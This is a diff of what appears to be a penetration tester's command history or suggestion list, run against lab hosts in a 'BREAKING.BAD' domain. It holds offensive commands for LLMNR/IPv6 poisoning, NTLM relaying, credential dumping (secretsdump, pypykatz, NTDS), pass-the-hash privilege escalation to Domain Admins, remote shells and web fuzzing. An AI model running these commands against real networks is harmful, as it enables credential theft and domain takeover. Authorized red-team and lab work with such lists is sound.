@@ -1,5 +1,5 @@
 responder --interface eth0 --analyze
-responder --interface eth0 --wredir --NBTNSdomain --wpad --lm
+responder --interface eth0 --NBTNSdomain --wpad --lm
 responder-http-off
 responder-http-on
 responder-smb-off
@@ -35,7 +35,7 @@ pth-net rpc group addmem 'Domain admins' 'Shutdown' -U 'BREAKING.BAD'/'Administr
 cme smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
 mitm6 --interface eth0
 mitm6 --interface eth0 --domain BREAKING.BAD
-responder --interface eth0 --wredir --NBTNSdomain --wpad --lm --ProxyAuth --ForceWpadAuth
+responder --interface eth0 --NBTNSdomain --wpad --lm --ProxyAuth --ForceWpadAuth
 ntlmrelayx -tf targets.txt -w -6 -smb2support -socks
 proxychains secretsdump -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
 proxychains smbexec.py -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
@@ -92,7 +92,6 @@ wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --plugins-de
 wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --enumerate u1-20
 smbserver.py SHUTDOWN .
 smbserver.py -smb2support SHUTDOWN .
-ffuf -c -w `fzf-wordlists` -u http://192.168.10.10/FUZZ
 nmblookup -A 192.168.10.10
 nmap --script 'smb-enum*' --script-args unsafe=1 -T5 192.168.10.10
 smbmap -H 192.168.10.10
@@ -154,10 +153,11 @@ wfuzz --hc 401 -c -v -w /usr/share/seclists/Usernames/top-usernames-shortlist.tx
 pypykatz lsa minidump lsass.dmp
 enyx 1 public 192.168.10.10
 wfuzz --hc 403,404 -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -u http://192.168.10.10/FUZZFUZ2Z
-ffuf -c -w `fzf-wordlists` -e .php,.txt,.pl,.sh,.asp,.aspx,.html,.json,.py,.cfm,.rb,.cgi,.bak,.tar.gz,.tgz,.zip -u http://192.168.10.10/FUZZ
 fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt file.zip
 ffuf -fs 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.machine.org' -u http://192.168.10.10/
 ffuf -fs 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.org' -u http://192.168.10.10/
+ffuf -c -w `fzf-wordlists` -e .php,.txt,.pl,.sh,.asp,.aspx,.html,.json,.py,.cfm,.rb,.cgi,.bak,.tar.gz,.tgz,.zip -u http://192.168.10.10/FUZZ
+ffuf -c -w `fzf-wordlists` -u http://192.168.10.10/FUZZ
 wfuzz --hh 185 -c -w `fzf-wordlists` -H "Host: FUZZ.machine.org" -u http://192.168.10.10/
 wfuzz --hh 185 -c -w `fzf-wordlists` -H "Host: FUZZ.org" -u http://192.168.10.10/
 evil-winrm -u serviceaccount -p P4ssw0rd -i 192.168.56.101
@@ -253,4 +253,6 @@ gosecretsdump -ntds ntds.dit.save -system system.save
 screen /dev/ttyACM0 115200
 httpmethods --threads 40 --location http://www.s01.breaking.bad/
 hakrawler -url http://www.s01.breaking.bad/
+adidnsdump -u "BREAKING.BAD\someuser" -p 'somepassword' --print-zones 192.168.56.101
+proxychains adidnsdump --dns-tcp -u "BREAKING.BAD\someuser" -p 'somepassword' --print-zones 192.168.56.101
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
